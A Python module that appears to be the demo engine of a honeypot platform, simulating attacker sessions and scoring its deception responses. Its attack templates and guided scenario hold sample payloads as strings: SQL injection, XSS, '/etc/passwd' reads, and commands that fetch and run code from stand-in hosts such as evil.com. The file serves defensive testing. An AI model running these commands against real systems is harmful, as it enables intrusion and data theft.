import time
import asyncio
import random
import logging
from typing import Dict, Any, List
from sqlalchemy.orm import Session
from backend.models.session import AttackerSession
from backend.models.attack import AttackLog
from backend.core.decision_engine import AutonomousDecisionEngine
from backend.core.deception_diagnostics import DeceptionDiagnosticsEngine
from backend.api.logs import ingest_log, LogRequest

logger = logging.getLogger("demo_engine")

# Attack templates from simulate_attacks.py
ATTACK_TEMPLATES = {
    "port_scan": {
        "payloads": ["", "SCAN / HTTP/1.1", "Nmap port sweep"],
        "ports": [22, 80, 443, 3306, 8080, 23]
    },
    "brute_force": {
        "payloads": ["admin/admin", "root/password123", "support/support", "guest/guest"],
        "ports": [22, 21, 3389]
    },
    "sql_injection": {
        "payloads": ["1' OR '1'='1", "admin' --", "' UNION SELECT username, password FROM users --", "1; DROP TABLE logs;"],
        "ports": [80, 3306, 8080]
    },
    "xss": {
        "payloads": ["<script>alert(1)</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert(1)>"],
        "ports": [80, 443]
    },
    "command_injection": {
        "payloads": ["; cat /etc/passwd", "| wget http://malicious.com/shell.sh", "&& whoami", "; id"],
        "ports": [80, 8080, 22]
    },
    "malware_delivery": {
        "payloads": ["MZ\x90\x00\x03\x00\x00\x00... [malware binary]", "eval(base64_decode('...'))", "curl http://evil.com/payload.exe -o payload.exe"],
        "ports": [80, 21, 445]
    },
    "path_traversal": {
        "payloads": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/static/../../config.json"],
        "ports": [80, 8080]
    }
}

EXPECTED_DECEPTION_STATES = {
    "port_scan": "port_expansion",
    "brute_force": "credential_trap",
    "sql_injection": "database_decoy",
    "xss": "web_decoy",
    "command_injection": "shell_trap",
    "malware_delivery": "malware_sink",
    "path_traversal": "filesystem_decoy"
}

def generate_random_ip() -> str:
    return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

async def run_closed_loop_simulation(db: Session, session_count: int = 5, step_delay: float = 0.02) -> int:
    """
    Core closed-loop attack simulation logic shared between CLI and API endpoints.
    """
    logger.info(f"[DEMO] Started simulation for {session_count} sessions.")
    events_generated = 0
    
    for i in range(session_count):
        ip_address = generate_random_ip()
        
        # Build attack chain
        steps = ["port_scan"]
        branch = random.choice(["database", "credentials", "server"])
        if branch == "database":
            steps.extend(["sql_injection", "path_traversal"])
        elif branch == "credentials":
            steps.extend(["brute_force", "command_injection"])
        else:
            steps.extend(["xss", "malware_delivery"])
            
        logger.info(f"[DEMO] Attacker {ip_address} executing chain: {' -> '.join(steps)}")
        
        for idx, attack_type in enumerate(steps):
            step_num = idx + 1
            template = ATTACK_TEMPLATES[attack_type]
            payload = random.choice(template["payloads"])
            port = random.choice(template["ports"])
            protocol = "TCP" if port != 23 else "Telnet"
            
            req = LogRequest(
                ip_address=ip_address,
                port=port,
                protocol=protocol,
                payload=payload,
                metadata={"agent": "Mozilla/5.0 Demo-Client", "step": step_num}
            )
            
            # Directly call ingestion pipeline
            res = await ingest_log(req, db)
            events_generated += 1
            
            deception = res.get("deception", {})
            chosen_state = deception.get("honeypot_state", "default")
            chosen_level = deception.get("interaction_level", "low")
            
            expected_state = EXPECTED_DECEPTION_STATES.get(attack_type, "default")
            is_convincing = (chosen_state == expected_state) and (chosen_level in ["medium", "high"])
            
            if is_convincing:
                await asyncio.sleep(step_delay)
            else:
                if random.random() < 0.75:
                    logger.info(f"[DEMO] Attacker {ip_address} detected decoy or low interaction. Exiting early.")
                    break
                else:
                    await asyncio.sleep(step_delay)
                    
        # Periodically trigger session closing to close out state entries
        from backend.core.cooperative_rl_engine import update_q_table_for_session
        active_sessions = db.query(AttackerSession).filter(AttackerSession.is_active == True).all()
        for session in active_sessions:
            session.is_active = False
            if session.rl_state and session.rl_action:
                update_q_table_for_session(
                    db=db,
                    session_id=session.session_id,
                    state_str=session.rl_state,
                    action_str=session.rl_action,
                    deception_score=session.rl_deception_score or 0.0
                )
        db.commit()
        
    logger.info(f"[DEMO] Attack Simulation Complete. Total events: {events_generated}")
    return events_generated


class GuidedDeceptionDemo:
    """
    Automated attack scenario replayer demonstrating PRAETOR's autonomous
    deception decision loops, ML classifications, and CMARL response optimizations.
    """
    def __init__(self, db: Session):
        self.db = db

    def execute_guided_scenario(self) -> Dict[str, Any]:
        """
        Executes a 5-stage attack chain and logs the resulting defensive telemetry.
        """
        session_id = f"demo_sess_{random.randint(100000, 999999)}"
        ip_address = f"198.51.100.{random.randint(2, 254)}"
        
        # Initialize Attacker Session
        session = AttackerSession(
            session_id=session_id,
            ip_address=ip_address,
            is_active=True,
            rl_state="start",
            rl_action="default:low",
            rl_network_action="default:medium",
            rl_intel_action="delayed_response"
        )
        self.db.add(session)
        self.db.commit()
        
        stages = [
            {"attack": "port_scan", "payload": "SYN Port Scan sweep", "risk": 45.0},
            {"attack": "brute_force", "payload": "SSH dictionary attack admin/admin", "risk": 75.0},
            {"attack": "sql_injection", "payload": "UNION SELECT username, password FROM users", "risk": 90.0},
            {"attack": "path_traversal", "payload": "GET /../../etc/passwd HTTP/1.1", "risk": 80.0},
            {"attack": "command_injection", "payload": "curl http://malicious.bin | sh", "risk": 95.0}
        ]
        
        decision_engine = AutonomousDecisionEngine(self.db)
        diagnostics = DeceptionDiagnosticsEngine(self.db)
        
        execution_trace = []
        
        for idx, stage in enumerate(stages):
            # Ingest simulated telemetry
            decision = decision_engine.evaluate_decision_state(
                ip_address=ip_address,
                current_session_id=session_id,
                attack_type=stage["attack"],
                confidence=0.95
            )
            
            log = AttackLog(
                session_id=session_id,
                ip_address=ip_address,
                attack_type=stage["attack"],
                payload=stage["payload"],
                confidence=0.95,
                risk_score=stage["risk"],
                deception_action=decision["recommended_strategy"]
            )
            self.db.add(log)
            
            execution_trace.append({
                "stage_index": idx + 1,
                "attack": stage["attack"],
                "mapped_mitre_technique": decision["predicted_next_ttp"],
                "deception_recommendation": decision["recommended_strategy"],
                "reasoning_trace": decision["reasoning_trace"]
            })
            
        # Finalize and calculate diagnostic scores
        session.is_active = False
        session.session_duration = 45.2
        session.interaction_depth = len(stages)
        session.rl_deception_score = 1.0
        self.db.commit()
        
        des_metrics = diagnostics.calculate_deception_effectiveness(session_id)
        rod_metrics = diagnostics.calculate_return_on_deception(session_id)
        
        return {
            "status": "success",
            "session_id": session_id,
            "ip_address": ip_address,
            "incident_stages_processed": len(stages),
            "attacker_dwell_time_seconds": 45.2,
            "deception_effectiveness": des_metrics,
            "return_on_deception": rod_metrics,
            "stages_trace": execution_trace
        }
